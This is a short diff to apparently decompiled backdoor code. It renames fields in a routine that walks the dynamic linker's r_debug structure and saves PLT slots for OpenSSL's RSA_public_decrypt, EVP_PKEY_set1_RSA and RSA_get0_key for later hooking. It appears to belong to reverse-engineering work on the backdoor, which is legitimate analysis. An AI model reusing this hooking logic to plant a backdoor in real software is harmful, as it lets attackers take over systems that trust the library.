@@ -34,11 +34,11 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
     r_debug_addr = ((elf_handles_t *)debug_block)->dynamic_linker->elfbase->e_ident + r_debug_symbol->st_value;
     success = FALSE;
     if (0 < *(int *)r_debug_addr) {
-      r_debug_sym = (Elf64_Sym *)data->data;
-      saved_RSA_public_decrypt_plt = data->RSA_public_decrypt_plt;
-      saved_EVP_PKEY_set1_RSA_plt = data->EVP_PKEY_set1_RSA_plt;
-      saved_RSA_get0_key_plt = data->RSA_get0_key_plt;
-      saved_hooks_data_addr = data->hooks_data_addr;
+      r_debug_sym = (Elf64_Sym *)data->shared_maps;
+      saved_RSA_public_decrypt_plt = data->rsa_public_decrypt_slot;
+      saved_EVP_PKEY_set1_RSA_plt = data->evp_set1_rsa_slot;
+      saved_RSA_get0_key_plt = data->rsa_get0_key_slot;
+      saved_hooks_data_addr = data->hooks_data_slot;
       saved_libc_imports = data->libc_imports;
       success = process_shared_libraries_map
                         (*(link_map **)(r_debug_addr + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
